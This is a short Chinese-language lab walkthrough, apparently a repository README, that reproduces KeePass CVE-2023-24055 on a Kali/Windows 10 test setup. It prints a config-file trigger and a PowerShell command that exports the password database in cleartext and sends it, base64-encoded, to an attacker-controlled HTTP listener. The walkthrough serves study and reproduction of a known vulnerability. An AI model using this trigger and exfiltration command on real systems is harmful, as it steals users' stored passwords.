# KeePass-CVE-2023-24055
KeePass CVE-2023-24055复现
KeePass CVE-2023-24055复现


1，准备机器：kali（192.168.232.129），windows10（192.168.232.128）

2,keepass版本：2.53
                   


2，原理：通过修改keepass配置文件KeePass.config.xml，添加触发器配置项：导出明文密码并上传到攻击者服务器上；添加触发器的xml代码如下：

其中：<Parameter>c:\Users\Long\AppData\Local\Temp\exploit.xml</Parameter>字段为设置导出明文密码的本机路径


使用powershell用get方法传输密码文件

<Parameter>PowerShell.exe</Parameter>
<Parameter>-ex bypass -noprofile -c $var=([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\Users\Long\AppData\Local\Temp\exploit.xml')));Invoke-WebRequest -uri http://192.168.232.129:8888/$var -Method GET </Parameter>




3，修改文件KeePass.config.xml，添加xml配置项并保存（添加位置：<TriggerSystem></TriggerSystem>标签内），打开keepass验证是否添加成功：




4，打开kali使用命令python3 -m http.server 8888开启web服务用以接收导出的密码铭文


5，打开keepass新建一个记录并保存，触发器被触发，查看kali接收的内容：




6，复制内容到文件，并使用base64进行解码，即得到明文密码


   









参考文章：https://github.com/alt3kx/CVE-2023-24055_PoC

https://www.youtube.com/watch?v=tqK1bns51ek



















